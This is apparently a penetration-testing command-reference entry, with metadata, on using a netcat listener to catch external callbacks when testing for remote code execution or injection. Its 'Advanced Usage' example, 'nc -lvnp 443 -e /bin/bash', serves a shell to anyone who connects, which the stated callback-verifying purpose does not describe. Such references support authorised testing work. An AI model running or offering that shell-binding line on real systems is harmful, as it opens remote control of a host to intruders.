---
data: nc -lvnp 80
tags:
  - listener
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:38:49.181Z'
id: 7bd36030-5118-4b3c-af9d-be157e728233
verified: false
validated: true
submitted: true
---
# netcat-listen

## Command

```bash
nc -lvnp 80
```

## Description

This command sets up a netcat listener on a specified port to capture incoming connections, useful for verifying external callbacks in RCE or injection exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-l` | Listen mode | Yes |
| `-v` | Verbose output | Yes |
| `-n` | No DNS resolution | Yes |
| `-p 80` | Port to listen on | Yes |

## Examples

### Basic Usage

```bash
nc -lvnp 80
```

### Advanced Usage

```bash
nc -lvnp 443 -e /bin/bash
```

## Expected Output

Listener output showing incoming connections, e.g., 'Connection from [IP]'; no output if no callbacks.

## Related

- [[commands/curl-external-request]]
- [[procedures/Test-DNS-Check-for-RCE]]
